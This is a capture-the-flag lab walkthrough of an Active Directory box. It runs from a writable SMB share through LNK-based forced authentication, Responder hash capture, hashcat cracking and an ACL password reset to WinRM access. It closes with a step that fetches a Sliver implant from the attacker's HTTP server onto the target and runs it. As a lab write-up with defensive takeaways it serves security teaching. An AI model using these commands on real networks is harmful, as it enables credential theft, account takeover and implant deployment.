---
title: "ShareThePain — Active Directory Walkthrough: Writable Share to Forced Auth to ACL Abuse"
description: "Active Directory walkthrough of ShareThePain (Windows Server 2022) — coercing DC authentication from a writable SMB share, cracking the hash, abusing an ACL reset, then pivoting toward an internal MSSQL service."
date: 2026-07-05 12:00:00 +0000
categories: [Active Directory]
tags: [active-directory, forced-authentication, responder, acl-abuse, pivoting, oscp]
difficulty: Hard
---

> **Box:** Active Directory (Hack Smarter / OSCP-style) · **OS:** Windows Server 2022 · **Domain:** hack.smarter · **Theme:** Writable share → forced-auth (LNK) → crack → ACL abuse → internal pivot

ShareThePain lives up to its name — the whole box pivots on a **writable SMB share** that the domain controller itself browses, which lets you coerce authentication and steal a hash without any starting credentials. From there it's the familiar Hack-Smarter AD rhythm: crack, map with BloodHound, abuse an ACL, and land the user flag — before the trail turns inward toward a local-only SQL service.

## Recon

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ rustscan -a 10.1.185.142 -- -A
Open 10.1.185.142:53
Open 10.1.185.142:88
Open 10.1.185.142:135
Open 10.1.185.142:139
Open 10.1.185.142:389
Open 10.1.185.142:445
Open 10.1.185.142:464
Open 10.1.185.142:593
Open 10.1.185.142:636
Open 10.1.185.142:3268
Open 10.1.185.142:3269
Open 10.1.185.142:3389
Open 10.1.185.142:5985
Open 10.1.185.142:9389
```

A textbook domain-controller footprint — DNS, Kerberos, LDAP, SMB, WinRM, ADWS. The certs named the domain **hack.smarter** and host **DC01**. Into `/etc/hosts`.

## SMB Enumeration — the writable share

A null session was permitted, so I listed shares straight away:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ nxc smb 10.1.185.142 -u '' -p '' --shares
SMB   10.1.185.142  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.1.185.142  445  DC01  [+] hack.smarter\:
SMB   10.1.185.142  445  DC01  Share       Permissions   Remark
SMB   10.1.185.142  445  DC01  -----       -----------   ------
SMB   10.1.185.142  445  DC01  ADMIN$                    Remote Admin
SMB   10.1.185.142  445  DC01  C$                        Default share
SMB   10.1.185.142  445  DC01  IPC$                      Remote IPC
SMB   10.1.185.142  445  DC01  NETLOGON                  Logon server share
SMB   10.1.185.142  445  DC01  Share       READ,WRITE
SMB   10.1.185.142  445  DC01  SYSVOL                    Logon server share
```

Among the defaults sat a custom share simply called **`Share`** — with **READ,WRITE** for everyone. On a box named ShareThePain, that's not subtle. Note **SMB signing is enabled** (`signing:True`), so relaying is off the table — but capturing and cracking is not.

## Forced Authentication — LNK poisoning

A writable share that privileged users (or the DC) browse is a classic **forced-authentication** setup. I planted a malicious shortcut on it with netexec's `slinky` module:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ nxc smb 10.1.185.142 -u 'guest' -p '' -M slinky -o SERVER=10.200.64.188 SHARES=Share NAME=systemd
SLINKY  10.1.185.142  445  DC01  [+] Found writable share: Share
SLINKY  10.1.185.142  445  DC01  [+] Created LNK file on the Share share
```

Then stood up Responder to catch the callback:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ sudo responder -I tun0 -v
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.1.185.142
[SMB] NTLMv2-SSP Username : HACK\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:e8c2599969a1cb3d:F9BBDB3A7D25A2228A5BBBC53D3AF2E8:0101000000000000...
```

Almost immediately, Responder logged repeated **NTLMv2** authentications from **HACK\bob.ross** — the share was being auto-rendered, and the shortcut's icon path forced the DC to authenticate to me.

## Cracking → bob.ross

I saved the captured NetNTLMv2 hash and cracked it with hashcat mode 5600:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
BOB.ROSS::HACK:e8c2599969a1cb3d:f9bbdb3a7d25a2228a5bbbc53d3af2e8:0101...:137Password123!@#
Hash.Mode........: 5600 (NetNTLMv2)
```

Creds: **BOB.ROSS : 137Password123!@#**.

## Foothold & Enumeration

The creds validated over SMB, and I ran a full BloodHound collection to find a path forward:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ nxc smb 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#'
SMB   10.1.185.142  445  DC01  [+] hack.smarter\BOB.ROSS:137Password123!@#

┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ nxc ldap 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.185.142
LDAP  10.1.185.142  389  DC01  [+] hack.smarter\BOB.ROSS:137Password123!@#
```

## ACL Abuse → alice.wonderland

BloodHound revealed that **BOB.ROSS** could reset the password of **ALICE.WONDERLAND**. One `net rpc` command later, that account was mine:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ net rpc password "ALICE.WONDERLAND" "cyber@123" -U "HACK.SMARTER"/"BOB.ROSS"%'137Password123!@#' -S 10.1.185.142

┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ nxc smb 10.1.185.142 -u 'ALICE.WONDERLAND' -p 'cyber@123'
SMB   10.1.185.142  445  DC01  [+] hack.smarter\ALICE.WONDERLAND:cyber@123
```

## User Flag

alice.wonderland had WinRM access:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/ShareThePain]
└─$ evil-winrm -i HACK.SMARTER -u 'ALICE.WONDERLAND' -p 'cyber@123'
*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> dir
    Directory: C:\Users\alice.wonderland\Desktop
-a----          9/3/2025   2:07 PM             54 user.txt
*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> type user.txt
bWFkZV9pdF90aGlzX2Zhcgo=      # base64 -d -> made_it_this_far
```

## Lateral Movement — toward the internal SQL service

Enumerating listeners from the alice.wonderland shell turned up something not exposed externally — **MSSQL bound to localhost**:

```powershell
*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> netstat -ano | findstr LISTENING
  TCP    127.0.0.1:1433         0.0.0.0:0              LISTENING       4260

*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> Get-Process -Id 4260
    829      57   367884     246416    4260   0 sqlservr
```

A local-only service means the next move is to **pivot** through this host to reach it. I generated a Sliver mTLS implant for the tunnel and staged it over a quick HTTP server:

```bash
[127.0.0.1] sliver > generate --mtls 10.200.64.188:443 --os windows --format exe pivot.exe
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m36s
[*] Implant saved to .../ADVISORY_GRATITUDE.exe
```

```powershell
*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> wget http://10.200.64.188:8000/ADVISORY_GRATITUDE.exe -O ADVISORY_GRATITUDE.exe
*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> ./ADVISORY_GRATITUDE.exe
```

## Privilege Escalation — root

*(This run's notes stop at the pivot implant.)* With a foothold session established, the next step is to tunnel into `127.0.0.1:1433` and attack the local MSSQL instance — authenticating and abusing its service context to escalate toward Administrator/root. I'll complete this section once I've captured the MSSQL path.

## Takeaways

- **Writable shares are forced-auth traps.** No creds needed — write access plus a browsing victim (here, the DC itself) equals a stolen NTLMv2 hash.
- **Signing on, but it didn't matter.** SMB signing blocks relaying, but it does nothing to stop *capturing* and cracking a weak password offline.
- **BloodHound turns a low-priv user into a path.** The bob.ross → alice.wonderland reset right is invisible by hand and obvious in the graph.
- **Localhost services are the next frontier.** An internally-bound MSSQL instance is only reachable after a foothold — pivoting is the escalation.
- **Defensive fixes:** remove write access from shares users don't need it on, disable LLMNR/NBT-NS to kill Responder, enforce strong passwords, and tighten dangerous reset ACLs.
